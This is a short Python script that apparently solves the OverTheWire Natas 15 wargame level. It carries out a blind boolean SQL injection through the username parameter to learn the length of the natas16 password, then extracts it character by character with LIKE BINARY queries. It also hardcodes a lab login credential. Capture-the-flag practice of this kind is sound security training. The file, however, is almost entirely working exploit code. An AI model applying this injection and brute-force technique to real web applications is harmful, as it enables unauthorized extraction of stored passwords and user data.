#!/bin/python3.9
# natas sqli to brute force passwords

import requests
import re


url = "http://natas15.natas.labs.overthewire.org"
username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

def authorization_test():

    get_auth = requests.get(url, auth=(username,password))

    s = '<h1>Unauthorized'
    response_check = re.search(s, get_auth.text)
    #print(response_check)
    
    if (str(response_check) != 'None'): 
        print('Authorization failed. Username, password, or url incorrect')
        exit()
    else:
        print('Authentication successful, continuing with exploit.')


def password_length_finder():
    
    for i in range(30,100):
        
        uri = ''.join([url,'/index.php','?','debug','&username=natas16"'," and (select 'a' from users where username = 'natas16' and length(password)>",str(i),')="a'])
        #print(uri)
        r = requests.post(uri, auth=(username,password))
        #print(r.text)

        s = "This user exists."
        length_check = re.search(s, r.text)

        if (str(length_check) == 'None'): 
            print('Password has length of %s.' % (i))
            length = i;
            return length
            break



def password_brute_force(pass_length):
    database_password = ''
    print("\nBrute forcing the password.\n")
    for i in range(0,pass_length+1):
        for j in characters:
            char = ''.join([database_password,j])
            uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"',char,'%','&debug'])
            #print(uri)
            #print(username, ':', password)
            r = requests.post(uri, auth=(username,password))
            #print(r.text)

            s = "This user exists."
            char_check = re.search(s, r.text)
            #print(char_check)

            if (str(char_check) != 'None'): 
                database_password += j
                print(f'Length: {len(database_password)}, Password: {database_password}')
                break
                


if __name__ == '__main__':
    authorization_test()
    password_length = password_length_finder()
    password_brute_force(password_length)